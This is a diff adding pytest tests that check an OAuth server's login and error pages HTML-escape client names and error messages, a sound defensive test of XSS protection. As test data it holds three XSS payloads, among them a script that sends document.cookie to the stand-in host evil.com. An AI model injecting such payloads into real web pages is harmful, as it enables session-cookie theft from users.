@@ -608,3 +608,81 @@ class TestTokenEndpoint:
         )
         
         assert response.status_code == 400
+
+
+# ============================================================================
+# XSS Protection Tests (Issue #42)
+# ============================================================================
+
+class TestXSSProtection:
+    """Tests for XSS protection in OAuth pages."""
+
+    def test_client_name_xss_escaped(self, client):
+        """Test that client_name is HTML-escaped in login page."""
+        # Register client with XSS payload in name
+        xss_payload = '<script>alert("xss")</script>'
+        reg_response = client.post(
+            f"{API_V1}/oauth/register",
+            json={
+                "redirect_uris": ["http://localhost/callback"],
+                "client_name": xss_payload,
+            },
+        )
+        client_id = reg_response.json()["client_id"]
+        
+        _, challenge = generate_pkce_pair()
+        
+        # Request the login page
+        response = client.get(
+            f"{API_V1}/oauth/authorize",
+            params={
+                "response_type": "code",
+                "client_id": client_id,
+                "redirect_uri": "http://localhost/callback",
+                "code_challenge": challenge,
+                "code_challenge_method": "S256",
+            },
+        )
+        
+        assert response.status_code == 200
+        # The raw XSS payload should NOT appear in the response
+        assert xss_payload not in response.text
+        # The escaped version should appear
+        assert "&lt;script&gt;" in response.text
+
+    def test_error_message_xss_escaped(self, client):
+        """Test that error messages are HTML-escaped in login page."""
+        # Register a client
+        reg_response = client.post(
+            f"{API_V1}/oauth/register",
+            json={"redirect_uris": ["http://localhost/callback"]},
+        )
+        client_id = reg_response.json()["client_id"]
+        
+        _, challenge = generate_pkce_pair()
+        
+        # Submit with wrong credentials to trigger error display
+        # The error message is hardcoded, so we test the escaping via
+        # the internal function directly
+        from valence.server.oauth import _login_page
+        
+        xss_payload = '<img src=x onerror="alert(1)">'
+        html_output = _login_page({}, "Test Client", error=xss_payload)
+        
+        # The raw XSS payload should NOT appear
+        assert xss_payload not in html_output
+        # The escaped version should appear
+        assert "&lt;img" in html_output
+
+    def test_error_page_xss_escaped(self, client):
+        """Test that error page messages are HTML-escaped."""
+        from valence.server.oauth import _error_page
+        
+        xss_payload = '<script>document.location="http://evil.com?c="+document.cookie</script>'
+        html_output = _error_page(xss_payload)
+        
+        # The raw XSS payload should NOT appear
+        assert xss_payload not in html_output
+        # The escaped version should appear
+        assert "&lt;script&gt;" in html_output
+        assert "evil.com" in html_output  # The text content is still there, just escaped
